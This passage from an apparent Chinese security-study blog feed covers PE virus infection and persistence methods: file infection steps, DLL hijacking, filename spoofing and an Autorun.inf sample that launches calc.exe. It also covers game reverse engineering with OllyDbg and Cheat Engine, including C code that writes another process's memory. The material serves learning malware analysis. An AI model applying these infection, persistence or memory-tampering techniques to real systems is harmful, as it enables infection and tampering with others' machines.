文件感染分类</h4><ul><li>插入式感染：将病毒代码插入到Host文件的代码节的中间或前后。这种感染方式会增加代码节的大小，并且可能修改Host程序中的一些参数实际位置，导致Host程序运行失败。</li><li>伴随式感染：备份Host程序，用自身替换Host程序。当病毒执行完毕后，再将控制权交给备份程序。</li></ul><h4 id="3-3-4-2-感染文件基本步骤"><a href="#3-3-4-2-感染文件基本步骤" class="headerlink" title="3.3.4.2 感染文件基本步骤"></a>3.3.4.2 感染文件基本步骤</h4><ol><li><p>判断目标文件开始2字节是否为“MZ”</p></li><li><p>判断PE文件标记“PE”</p></li><li><p>判断感染标记，如果已被感染过则跳出继续执行Host程序，否则继续</p></li><li><p>获得数据目录的个数(每个数据目录信息占8个字节)</p></li><li><p>得到节表起始位置(数据目录的偏移地址 + 数据目录占用的字节数 = 节表起始地址)</p></li><li><p>得到目前最后节表的末尾偏移(紧接其后用于写入一个新的病毒节)</p><p>节表起始位置 + 节的个数 = 目前最后节表的末尾偏移</p><p>每个节表占用的字节数为0x28</p></li><li><p>写入节表和病毒节</p></li><li><p>修正文件头信息</p></li></ol><h1 id="4-捆绑释放型"><a href="#4-捆绑释放型" class="headerlink" title="4. 捆绑释放型"></a>4. 捆绑释放型</h1><p>捆绑释放型感染实现起来比较简单，目前很大一部分病毒程序都采用这种方法。捆绑释放型病毒感染时将目标Host程序作为数据存储在病毒体内，当执行病毒程序时，它先执行病毒程序，然后还原并执行Host文件，从而保证被感染的程序本身能正常运行，不会引起异样。</p><p>熊猫烧香就属于这一类病毒。如下图，左边是一个正常程序，感染后(右边)会将病毒放在前面，正常程序放在后面。程序运行时，病毒会拿到控制权，但是程序图标会显示前面的病毒程序，这也是一个明显的被感染特征。</p><img src="/posts/adc1352a/4.1.1.png" class="" title="捆绑释放型病毒"><ul><li>优点：编写简单、效率高，可感染自校验程序</li><li>缺点：被感染后的程序主体是病毒程序，易被发现(程序叠加+释放执行)，程序图标问题</li></ul><h1 id="5-系统感染型"><a href="#5-系统感染型" class="headerlink" title="5. 系统感染型"></a>5. 系统感染型</h1><p>系统感染型本身不对PE文件做任何感染操作，但它感染的目标是操作系统，也是一种寄生类的方式，只是寄生目标有所不同。这类病毒通常为独立个体，不感染系统内的其它文件。</p><p>系统感染型病毒存在两个两个关键问题：</p><ul><li><p>如何再次获得控制权——自启动</p><p>由于该程序不感染PE文件，它没有Host文件，所以如何再次获得控制权是一个关键性问题，也是目标很多病毒程序设计时不得不考虑的问题。此时和操作系统自启动相关，病毒必须依赖于该机制再次获得控制权。</p></li><li><p>如何传播：可移动存储介质(U盘、移动硬盘、刻录光盘等)、网络共享、电子邮件或其它应用。</p></li></ul><h2 id="5-1-控制权再次获取"><a href="#5-1-控制权再次获取" class="headerlink" title="5.1 控制权再次获取"></a>5.1 控制权再次获取</h2><p>操作系统启动流程：BIOS -&gt; 硬盘MBR -&gt; 活动分区DBR -&gt; 系统内部</p><p>操作系统整个启动流程也是控制权传递的过程，包括现在提出的可信计算，也是对控制权一步一步地校验，控制流程的数据完整性或行为的校验。对于操作系统本身，它的启动方式很多，系统内部包括：</p><ul><li>注册表中的键值</li><li>系统中的特定位置</li><li>配置文件</li><li>特定路径的特定文件，如<code>Explorer.exe</code>(显示桌面)</li></ul><p>如果病毒本身能很好地结合这套机制，它可以做的事情非常多，并且具有很好的隐蔽性。</p><p>其它启动方式：</p><ul><li><p>利用系统自动播放机制<code>Autorun.inf</code></p><p>比如U盘病毒或光盘病毒就是利用U盘或光盘的自动播放功能。目前，也有一些U盘插入后，不需要用户双击U盘，里面的程序也会启动。</p></li><li><p>在其它可执行文件嵌入少量触发代码</p><ul><li>修改导入函数节启动DLL病毒文件(添加相应结构，初始化代码触发)</li><li>在特定PE文件代码段插入触发代码等(只需定位可执行程序并运行)</li></ul></li><li><p>DLL劫持：替换已有DLL文件</p><p>很多应用程序或操作系统执行时，都会去执行DLL文件，如果病毒将自身做成一个DLL文件，同时将系统DLL文件替换。可想而知，系统启动时，它会根据文件名启动的，此时病毒DLL文件就会拿到控制权，如果拿到控制权之后再进一步装载原始DLL文件，这样系统的本身机制也不会受到影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的DLL文件替换。</p></li></ul><h2 id="5-2-病毒的传播方式"><a href="#5-2-病毒的传播方式" class="headerlink" title="5.2 病毒的传播方式"></a>5.2 病毒的传播方式</h2><p>一切可对外交互的渠道都可传播，包括：</p><ul><li>各类存储设备(软盘、光盘、U盘、移动硬盘、智能设备)</li><li>各类网络通信方式(QQ、MSN、Email、淘宝旺旺、微信、微博等)</li><li>各类网络连接方式(有线、WIFI、蓝牙等)</li><li>各类网络应用(迅雷、BT等)</li></ul><p>邮件蠕虫越来越常见，其中以邮件附件的形式进行传播较多。附件中可能包含病毒包括exe文件、rar文件、pdf文件、doc文件、xls文件、jpg文件、chm文件等。下图是一个包含病毒的邮件附件，显示为一个word文档，后缀名doc，图标显示也是word。但它的真实后缀是scr(屏保)，它其实是利用了一种技术，在文件名里插入翻转字符，然后将翻转字符之后的其它字符进行了翻转，它的完整文件名应该是“5月TW行lmcod.scr”。这也是一种欺骗性很强的攻击手法。</p><img src="/posts/adc1352a/5.2.1.png" class="" title="包含病毒的邮件附件"><p>再补充一个通过可移动存储设备传播的非感染式病毒，即<code>Autorun.inf</code>。下图显示了<code>Autorun.inf</code>文件，如果文件存在U盘根目录，当我们双击这个U盘时，它就会触发对应的病毒，如果选择U盘盘符右键打开或打开资源管理器，这时进入的也是病毒程序。当然下面的演示是计算器程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[AutoRun]</span><br><span class="line">open=mspaint.exe</span><br><span class="line">shell\open=打开(&amp;O)</span><br><span class="line">shell\open\Command=calc.exe</span><br><span class="line">shell\open\Default=1</span><br><span class="line">shell\explore=资源管理器(&amp;X)</span><br><span class="line">shell\explore\Command=calc.exe</span><br></pre></td></tr></table></figure><img src="/posts/adc1352a/5.2.2.png" class="" title="Autorun.inf"><p>还有一类是伪装的文件夹，如下图所示的<code>photo.exe</code>文件，当Windows操作系统默认不显示<code>.exe</code>时，它就能伪装成文件夹，当我们双击之后就会运行病毒，同时可以打开某个文件夹进行隐蔽。</p><img src="/posts/adc1352a/5.2.3.png" class="" title="photo.exe"><p>最后，补充“摆渡”知识点，这种攻击行为经常发生在一些具有特殊目的病毒程序身上。期望通过可移动的媒介来渗透一些平时不联网的电脑中，并从中获取数据，利用摆渡的方式植入病毒或木马到内网，比较典型的案例就是Stuxnet。</p><p>下图展示了Stuxnet震网事件的漏洞利用过程和启动方式，传统的Autorun方式很容易被禁止掉，而Stuxnet利用的是lnk漏洞（MS10-046），它会在目标U盘下放入lnk快捷方式及病毒程序（如DLL文件）。不管通过什么方式进入U盘，lnk文件都会被解析从而触发漏洞，导致U盘中的病毒程序被执行。</p><img src="/posts/adc1352a/5.2.4.png" class="" title="Stuxnet震网事件">]]></content>
    
    
    <summary type="html">&lt;p&gt;以后我们很长时间都要与Windows PE病毒打交道，所以在这里就先了解下它的分类及感染方式吧。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>逆向分析基础</title>
    <link href="http://example.com/posts/8ba499c5.html"/>
    <id>http://example.com/posts/8ba499c5.html</id>
    <published>2022-05-21T00:41:19.909Z</published>
    <updated>2022-07-19T14:14:10.984Z</updated>
    
    <content type="html"><![CDATA[<p>现在就要跟随 <a href="https://blog.csdn.net/Eastmount">Eastmount</a> 老师学习系统安全与恶意代码分析了，是的，终于要真正的系统地学习了~加油小凉！</p><span id="more"></span><h1 id="1-逆向分析学习路线"><a href="#1-逆向分析学习路线" class="headerlink" title="1. 逆向分析学习路线"></a>1. 逆向分析学习路线</h1><img src="/posts/8ba499c5/%E5%AD%A6%E4%B9%A0%E6%8A%80%E8%83%BD%E5%9B%BE.png" class="" title="逆向分析学习路线"><h1 id="2-逆向分析的典型应用"><a href="#2-逆向分析的典型应用" class="headerlink" title="2. 逆向分析的典型应用"></a>2. 逆向分析的典型应用</h1><h2 id="2-1-病毒分析"><a href="#2-1-病毒分析" class="headerlink" title="2.1 病毒分析"></a>2.1 病毒分析</h2><p>逆向分析主要是剖析病毒，包括：</p><ul><li>获取病毒传播方法，遏制病毒传播</li><li>获取病毒隐藏手段，根除病毒</li><li>获取功能目的，溯源定位攻击者</li></ul><h2 id="2-2-游戏保护"><a href="#2-2-游戏保护" class="headerlink" title="2.2 游戏保护"></a>2.2 游戏保护</h2><p>这个主要是用来做游戏外挂。比如修改攻击力、防御值、金币等。</p><h2 id="2-3-漏洞挖掘"><a href="#2-3-漏洞挖掘" class="headerlink" title="2.3 漏洞挖掘"></a>2.3 漏洞挖掘</h2><p>逆向应用还包括漏洞挖掘和漏洞利用，其中黑客挖掘漏洞的常用方法为：</p><ul><li>通过分析开源软件的源代码，获取漏洞</li><li>通过分析产品本身，获取漏洞</li><li>通过分析可以利用漏洞的软件样本</li><li>通过比较软件前后补丁的差异</li></ul><p>比如官方软件在网上有安全更新，关注安全行情和漏洞公告的行当或企业会对比官方的补丁，在拿到官方升级后的软件，他们会对两个软件流程作比较，分析补丁补了哪里，再详细分析为什么多了这个检测。注意，官方公告通常会非常简略(补丁号、造成后果、影响范围)。比如某个MP3播放器在播放某个冷门格式的音频文件时，会触发一个远程溢出问题，我们就需要去逆向分析，下载升级前后版本做流程对比。</p><h2 id="2-4-电子取证"><a href="#2-4-电子取证" class="headerlink" title="2.4 电子取证"></a>2.4 电子取证</h2><p>通过样本试图找出是谁(Who)、在什么时间(When)、在哪里(Where)、怎样地(How)进行了什么(What)(非法)活动。</p><h2 id="2-5-无文档学习"><a href="#2-5-无文档学习" class="headerlink" title="2.5 无文档学习"></a>2.5 无文档学习</h2><p>表示没有源码的情况下获取程序信息，称为竞品分析。假设某个公司对同行的产品很感兴趣，想知道为什么他们的算法比我们好，然后需要去分析和算法还原，这也是逆向分析的主要应用。</p><h1 id="3-扫雷游戏逆向分析"><a href="#3-扫雷游戏逆向分析" class="headerlink" title="3. 扫雷游戏逆向分析"></a>3. 扫雷游戏逆向分析</h1><img src="/posts/8ba499c5/2.1.png" class="" title="扫雷"><p>扫雷中肯定有雷区的定义，作为程序员，你会怎样定义有雷或无雷，或者插旗子状态呢？我们会使用一个二维数组来存储。那么，什么时候肯定会访问这个二维数组呢？在绘制整个游戏区、点击方格的时候都会访问到。</p><p>在绘制游戏区时，Windows编程有个关键函数<code>BeginPaint()</code>，它为指定窗口进行绘图工作的准备，并用将和绘图有关的信息填充到一个<code>PAINTSTRUCT</code>结构中，所以它将是一个突破口。</p><p>在逆向分析中，动态分析和静态分析非常多，动静结合也是常用的分析手段。</p><ul><li>静态分析：程序并未运行，通过分析文件的结构(格式)获取其内部原理。</li><li>动态分析：在程序的运行过程中，分析其内部原理。</li><li>灰盒分析：既不静态也不动态调试，通过一堆监控软件(注册表监控、文件监控、进程监控、敏感API监控)在虚拟机中跑程序，再分析恶意软件的大体行为，并形成病毒分析报告。</li></ul><p>至于哪种方法更好？具体问题具体分析。如果分析扫雷，因为没有危害可以动态调试，但如果是WannaCry蠕虫，就不能在真机上动态调试。同时，很多安全公司为了及时响应各种安全事件，会把样本自动上传到服务器中，他们每天会收到成千上万的恶意样本，但可能存在某些未知样本只上传部分的原因，比如某个未知样本是个动态链接库，此时没有运行条件，只能进行静态分析或者模拟接口分析。</p><h2 id="3-1-OD动态分析"><a href="#3-1-OD动态分析" class="headerlink" title="3.1 OD动态分析"></a>3.1 OD动态分析</h2><p>我们采用动态分析的方法分析扫雷程序。之前我们猜测游戏中存在一个二维数组，当我们显示界面时会访问这个二维数组，并且调用<code>BeginPaint()</code>函数来显示页面，所以接下来需要找到调用<code>BeginPaint()</code>的位置。</p><p>将程序载入OD，Ctrl + N 查找当前模块中的名称，输入<code>BeginPaint</code>，右键 -&gt; 在每个参考上设置断点。</p><img src="/posts/8ba499c5/2.1.1.png" class="" title="查找BeginPaint"><p>Alt + B 去到断点窗口，发现只有一个。F9 运行程序至断点处，此时程序界面还没出来。</p><img src="/posts/8ba499c5/2.1.2.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现<code>BeginPaint()</code>函数下面还有一个<code>EndPaint()</code>，表示绘图结束，也就是游戏结束。所以这两个函数之间的数据就是我们玩游戏的过程。两个系统函数之间只有一个程序函数<code>01002AC3()</code>，选中该行 Enter 跟随该函数。</p><img src="/posts/8ba499c5/2.1.3.png" class="" title="去到BeginPaint被调用的汇编代码处"><p>发现这里面也有几个程序函数，一个个看后发现只有<code>010026A7()</code>里有双重循环，也就是构成二维数组的基本条件。</p><p>当然，这种方法太过草率也太耗费时间了，如果遇到大一点的程序，工作量还是挺大的。可以使用另一种方法。当我们在玩扫雷时，它的界面并没有闪烁，所以怀疑使用了双缓存技术。</p><p>双缓存是在缓存中一次性绘制，再把绘制的结果返回到界面上。比如要在屏幕上绘制一个圆、正方形、直线，需要调用GDI的显示函数，操作显卡画一个圆，再画一个正方形、一条直线，需要访问硬件3次，此时依赖硬件的访问速度。为了减少硬件操作，我们在内存中把需要绘制的图像准备好，一切妥当后再提交给硬件显示。</p><p><code>BitBlt()</code>函数是将内存中的数据提交到显示器上，该函数对指定的源设备环境区域中的像素进行位块转换，以传送到目标设备环境。同样方法查找<code>BitBlt()</code>函数，设置断点，运行，程序停在了<code>010026A7()</code>函数里的<code>BitBlt()</code>函数中。需要注意的是，调用<code>BitBlt()</code>函数有两处地方，为了验证这里是否是我们要找的地方，可以单步调试看看游戏界面情况。</p><img src="/posts/8ba499c5/2.1.4.png" class="" title="单步数次执行的界面情况"><p>绘制一个个方块的过程，也就是初始化“有雷”和“无雷”的过程，说明我们之前找的地方没错。</p><p>另一处调用<code>BitBlt()</code>函数，是点击方块时，绘制该方块是“数字”还是“雷”的过程。这时候只是将这个过程显示在用户界面上，对我们来说只是一个验证作用。</p><p><code>010026A7()</code>函数里的<code>BitBlt()</code>函数在界面初始化“有雷”和“无雷”，那肯定将这些数据存在了某个地方。接下来就是分析这双重循环。</p><img src="/posts/8ba499c5/2.1.5.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.6.png" class="" title="分析双重循环"><img src="/posts/8ba499c5/2.1.7.png" class="" title="分析双重循环"><p>经过<code>mov al,byte ptr ds:[ebx+esi]</code>可以知道al的值是取数据段寄存器中以ebx为基址，esi为偏移的地址的内容。</p><img src="/posts/8ba499c5/2.1.8.png" class="" title="分析双重循环"><p>所以ebx存的就是“有雷”和“无雷”二维数组的首地址。我们知道，一行有9个方块，根据规律可以猜测，<code>10</code>作为边界，<code>0F</code>表示空，<code>8F</code>就是雷。</p><p>将所有断点取消，数据窗口 Ctrl + G 定位到地址<code>01005360</code>，验证猜测。</p><p>注意，如果第一次点击的就是雷的话，会改变雷的位置(可能是避免倒霉孩子没有游戏体验吧)。如果方块中是旗子显示<code>8E</code>，方块中是空白显示<code>40</code>，方块中是1则显示<code>41</code>，2是<code>42</code>，以此类推。雷被点中后将<code>8F</code>改为<code>CC</code>，将剩余的雷改为<code>8A</code>。经过多次游戏，证实了上面的猜测。</p><img src="/posts/8ba499c5/2.1.9.png" class="" title="分析双重循环"><h2 id="3-2-逆向辅助工具CE"><a href="#3-2-逆向辅助工具CE" class="headerlink" title="3.2 逆向辅助工具CE"></a>3.2 逆向辅助工具CE</h2><p>Cheat Engine又称CE修改器，是一款内存修改编辑工具。可以通过Cheat Engine来修改游戏中的内存数据、人物属性、金币数值等等。</p><p>我们现在的目的是利用CE获取第一个方块的地址，验证与在OD找的是否一致。运行扫雷，打开CE，附加扫雷进程。在OD中看，一个字节存储在一个方块中，所以将数值类型设为“字节”，扫描类型设为“未知的初始数值”，首次扫描。</p><img src="/posts/8ba499c5/2.2.1.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.2.png" class="" title="CE使用"><p>此时显示1056768个数据。接着点击第一个方块，该方块由<code>0F</code>变为<code>40</code>，所以在扫描类型中选择“变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.3.png" class="" title="CE使用"><p>点击扫雷，由于第一个方块不再变化数值，所以选择“未变动的数值”进行筛选，再次扫描，连续几次，发现数据的个数一直在变小，说明经过几轮筛选逐渐缩小范围。如果出现地雷则选择“未变动的数值”，再次扫描。</p><img src="/posts/8ba499c5/2.2.4.png" class="" title="CE使用"><p>点击笑脸重新开始游戏，此时第一个方块从<code>40</code>变为<code>0F</code>，所以扫描类型修改为“变动的数值”，再次扫描。</p><p>重复上述步骤，直到结果为1。</p><img src="/posts/8ba499c5/2.2.5.png" class="" title="CE使用"><p>这个地址刚好是我们在OD中找的第一个方块的地址。</p><img src="/posts/8ba499c5/2.2.6.png" class="" title="CE使用"><img src="/posts/8ba499c5/2.2.7.png" class="" title="CE使用"><p>第二步验证扫雷的边界。自定义扫雷的高度为9，扫出来有1627个数据。再次定义高度为16，从9变到16的数据有4个。再次定义高度为24，从16变到24的有2个。因为边界需要两个值来定义，所以就是<code>01005338</code>和<code>010056A8</code>。</p><img src="/posts/8ba499c5/2.2.8.png" class="" title="CE使用"><p>同样筛选出存储宽度的地址，分别是<code>01005334</code>和<code>010056AC</code>。筛选出雷数的存储地址为<code>01005330</code>。</p><p>后面就可以利用这些地址开始学习研究了，比如一秒实现扫雷等。</p><h1 id="4-吕布传游戏逆向分析"><a href="#4-吕布传游戏逆向分析" class="headerlink" title="4. 吕布传游戏逆向分析"></a>4. 吕布传游戏逆向分析</h1><p>关于NPC说话太慢，找到快速跳过对话的方法。</p><p>将<code>Ekd5.exe</code>载入OD，查找当前模块中的名称，查看调用了哪些函数。发现程序竟然有几个钩子函数。</p><img src="/posts/8ba499c5/4.1.1.png" class="" title="查看调用函数"><p>钩子函数是Windows消息处理机制的一部分，通过设置“钩子”，应用程序可以在系统级对所有消息、事件进行过滤，访问在正常情况下无法访问的消息。钩子的本质是一段用以处理系统消息的程序，通过系统调用，把它挂入系统。</p><ul><li>SetWindowsHookEx：设置钩子函数</li><li>CallNextHookEx：将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</li><li>UnhookWindowsHookEx：上一个函数<code>SetWindowsHookEx()</code>的返回值，钩子在使用完之后需要用该函数卸载</li></ul><p>在每个<code>SetWindowsHookEx()</code>处下断，一共两处。运行，停在了<code>00429EF7</code>处。可以看到该钩子函数是通过键盘输入触发，回调函数的地址为<code>0040D307</code>，也就是触发后会去到该地址处。</p><p>Ctrl + G 去到该地址处，下断，运行。游戏载入，随意从键盘上输入。</p><img src="/posts/8ba499c5/4.1.2.png" class="" title="游戏界面"><p>此时触发钩子函数，使汇编去到<code>0040D307</code>处。我输入的是“a”，运行到cmp指令时，eax存的值就是“a”的ASCII码的十六进制形式，与<code>0x20</code>(空格)进行对比，往下看还有与<code>0x30</code>(“0”)、<code>0x35</code>(“5”)对比的。</p><img src="/posts/8ba499c5/4.1.3.png" class="" title="eax对比"><p>先看<code>0x20</code>。重载运行，在键盘按下空格键。对比通过，进入<code>00406A33</code>函数，这个函数里有一个创建线程函数，线程在<code>00406A7F</code>处。继续跟随到该地址，下断运行。</p><img src="/posts/8ba499c5/4.1.4.png" class="" title="创建线程函数"><p>在<code>00406A7F</code>函数中，有两个<code>PostMessage()</code>函数，该函数的作用是将一条消息放入消息队列中。一个是“鼠标按下”，另一个是“鼠标弹起”，中间还有个<code>sleep()</code>函数，这个过程是模拟玩家点击鼠标的操作。</p><img src="/posts/8ba499c5/4.1.5.png" class="" title="PostMessage函数"><p>那么，我们就找到了一个快速跳过对话的方法，就是按空格键。要想取消快速对话，同样也是按空格键。<code>ds:[0x500E02]</code>中存储着跳过与否的值，“1”表示快速跳过，“0”表示不跳过。</p><p><code>0x30</code>(“0”)、<code>0x35</code>(“5”)没什么用的，可能只是过滤玩家的不合法输入。</p><h1 id="5-植物大战僵尸游戏逆向分析"><a href="#5-植物大战僵尸游戏逆向分析" class="headerlink" title="5. 植物大战僵尸游戏逆向分析"></a>5. 植物大战僵尸游戏逆向分析</h1><h2 id="5-1-CE逆向修改阳光值"><a href="#5-1-CE逆向修改阳光值" class="headerlink" title="5.1 CE逆向修改阳光值"></a>5.1 CE逆向修改阳光值</h2><p>修改阳光值首先要知道存储阳光值的地址在哪里。通过CE找到该地址，为<code>25B42938</code>。</p><img src="/posts/8ba499c5/5.1.1.png" class="" title="CE查找存储阳光值的地址"><p>打开资源管理器，查看这个游戏的进程ID，为12064。</p><img src="/posts/8ba499c5/5.1.2.png" class="" title="CE查找存储阳光值的地址"><p>在修改阳光值之前，要先确定我们要修改值的窗口是哪一个，可以通过API函数<code>FindWindow()</code>来查找。这个函数检索处理顶级窗口的类名和窗口名称匹配指定的字符串，这个函数不搜索子窗口。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HWND <span class="title function_">FindWindow</span><span class="params">(</span></span><br><span class="line"><span class="params">    LPCSTR lpClassName,</span></span><br><span class="line"><span class="params">    LPCSTR lpWindowName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>lpClassName：指向一个以NULL字符结尾的、用来指定类名的字符串或一个可以确定类名字符串的原子。如果该参数为null时，将会寻找任何与<code>lpWindowName</code>参数匹配的窗口。</li><li>lpWindowName：指向一个以NULL字符结尾的、用来指定窗口名（即窗口标题）的字符串。如果此参数为null，则匹配所有窗口名。</li></ul><p><code>FindWindow()</code>需要传入两个参数，即窗口的类型和窗口的标题。这里可以用到Visual Studio中的Spy++工具来查看在本机中运行的窗口的相关信息。</p><img src="/posts/8ba499c5/5.1.3.jpg" class="" title="CE查找存储阳光值的地址"><img src="/posts/8ba499c5/5.1.4.png" class="" title="CE查找存储阳光值的地址"><p>句柄为<code>00600BEE</code>，标题为<code>Plants vs. Zombies 1.2.0.1073 RELEASE</code>，类为<code>MainWindow</code>。</p><p>当然，每次运行的句柄和进程ID都不一样，千万不要把这两个值写死，而是通过API函数自动获取这些信息。</p><p>接下来介绍几个等下要用到的API函数：</p><ul><li>通过<code>GetWindowThreadProcessld()</code>函数找到进程ID。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetWindowThreadProcessld</span><span class="params">(</span></span><br><span class="line"><span class="params">HWND hwnd,                   <span class="comment">//窗口句柄</span></span></span><br><span class="line"><span class="params">LPDWORD lpdwProcessld        <span class="comment">//接收进程标识的32位值的地址</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><ul><li>通过<code>OpenProcess()</code>函数打开一个已存在的进程对象，并返回进程的句柄。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">OpenProcess</span><span class="params">(</span></span><br><span class="line"><span class="params">DWORD dwDesiredAccess,   <span class="comment">//渴望得到的访问权限（标志）</span></span></span><br><span class="line"><span class="params">BOOL bInheritHandle,     <span class="comment">//是否继承句柄</span></span></span><br><span class="line"><span class="params">DWORD dwProcessId        <span class="comment">//进程标示符</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>dwDesiredAccess</code>可分为以下几种：</p><div class="table-container"><table><thead><tr><th>字段值</th><th>含义</th></tr></thead><tbody><tr><td>PROCESS_ALL_ACCESS</td><td>获取所有权限</td></tr><tr><td>PROCESS_CREATE_PROCESS</td><td>创建进程</td></tr><tr><td>PROCESS_CREATE_THREAD</td><td>创建线程</td></tr><tr><td>PROCESS_DUP_HANDLE</td><td>使用DuplicateHandle()函数复制一个新句柄</td></tr><tr><td>PROCESS_QUERY_INFORMATION</td><td>获取进程的令牌、退出码和优先级等信息</td></tr><tr><td>PROCESS_QUERY_LIMITED_INFORMATION</td><td>获取进程特定的某个信息</td></tr><tr><td>PROCESS_SET_INFORMATION</td><td>设置进程的某种信息</td></tr><tr><td>PROCESS_SET_QUOTA</td><td>使用SetProcessWorkingSetSize()函数设置内存限制</td></tr><tr><td>PROCESS_SUSPEND_RESUME</td><td>暂停或者恢复一个进程</td></tr><tr><td>PROCESS_TERMINATE</td><td>使用Terminate()函数终止进程</td></tr><tr><td>PROCESS_VM_OPERATION</td><td>在进程的地址空间执行操作</td></tr><tr><td>PROCESS_VM_READ</td><td>使用ReadProcessMemory()函数在进程中读取内存</td></tr><tr><td>PROCESS_VM_WRITE</td><td>使用WriteProcessMemory()函数在进程中写入内存</td></tr><tr><td>SYNCHRONIZE</td><td>使用wait()函数等待进程终止</td></tr></tbody></table></div><ul><li>通过<code>WriteProcessMemory()</code>函数写入某一进程的内存区域。注意，直接写入会出现“Access Violation”错误，故需此函数入口区必须可以访问，否则操作失败。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE hProcess,                 <span class="comment">//由OpenProcess返回的进程句柄</span></span></span><br><span class="line"><span class="params">LPVOID lpBaseAddress,            <span class="comment">//要写入的内存首地址</span></span></span><br><span class="line"><span class="params">LPVOID lpBuffer,                 <span class="comment">//指向数据当前存放的地址</span></span></span><br><span class="line"><span class="params">DWORD nSize,                     <span class="comment">//数据的长度</span></span></span><br><span class="line"><span class="params">LPDWORD lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//输入值作为修改阳光参数</span></span><br><span class="line"><span class="type">int</span> x;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line"></span><br><span class="line"><span class="comment">//进程ID</span></span><br><span class="line">DWORD pid;</span><br><span class="line"></span><br><span class="line"><span class="comment">//1.找到游戏窗口 窗口类型、窗口标题</span></span><br><span class="line">HWND hwnd = FindWindow(<span class="literal">NULL</span>, <span class="string">L&quot;Plants vs. Zombies 1.2.0.1073 RELEASE&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.通过窗口找到进程ID</span></span><br><span class="line">GetWindowThreadProcessId(hwnd, &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.通过进程id打开进程</span></span><br><span class="line">HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.通过打开进程修改游戏内容</span></span><br><span class="line">WriteProcessMemory(hProcess, (LPVOID)<span class="number">0x25B42938</span>, (LPVOID)&amp;x, <span class="keyword">sizeof</span>(x), &amp;pid);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>芜湖实现阳光自由了~</p><img src="/posts/8ba499c5/5.1.5.png" class="" title="CE查找存储阳光值的地址"><p>经多次实验发现，每次存储阳光值的地址都不同，所以每次都需要用CE找到其地址再进行修改。</p><p>注意，如果游戏存在地址保护的情况，可以尝试注入进行修改。(我还没到那种水平，遇到再说)</p><h2 id="5-2-OD逆向自动拾取阳光"><a href="#5-2-OD逆向自动拾取阳光" class="headerlink" title="5.2 OD逆向自动拾取阳光"></a>5.2 OD逆向自动拾取阳光</h2><p>拾取阳光的关键是点击鼠标，点击到阳光，阳光值会增加。所以我们希望在阳光出现的时候触发点击阳光事件，初步预测涉及两个call：</p><ul><li>阳光出现call</li><li>判断是否点击到阳光然后增加阳光值call</li></ul><p>使用CE定位阳光值地址，选中该地址右键 -&gt; 找出是什么改写了这个地址。当再次拾取阳光时，阳光值从75变到了100，同时CE的小窗口出现了一条记录。</p><img src="/posts/8ba499c5/5.2.1.png" class="" title="OD逆向自动拾取阳光"><p>选中这条记录，下面会出现相关的汇编指令和当前寄存器的值。eax寄存器存的就是每次拾取阳光增加的数值25。</p><img src="/posts/8ba499c5/5.2.2.png" class="" 